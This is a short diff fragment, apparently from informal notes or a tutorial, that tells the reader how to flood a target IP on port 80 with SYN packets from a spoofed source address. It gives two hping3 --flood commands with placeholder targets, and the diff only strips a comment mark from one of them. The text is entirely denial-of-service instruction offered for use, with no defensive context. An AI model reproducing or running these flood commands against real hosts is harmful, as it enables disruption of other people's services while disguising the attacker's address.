@@ -3,7 +3,7 @@
 
 Similarly if u wanna flood the IP x.x.x.x on port 80 with SYN requests from fake IP y.y.y.y, type
 
-# hping3 -S -a y.y.y.y --flood -p 80 x.x.x.x
+ hping3 -S -a y.y.y.y --flood -p 80 x.x.x.x
 
  hping3 -S --flood -V -p TARGET_PORT TARGET_SITE
  
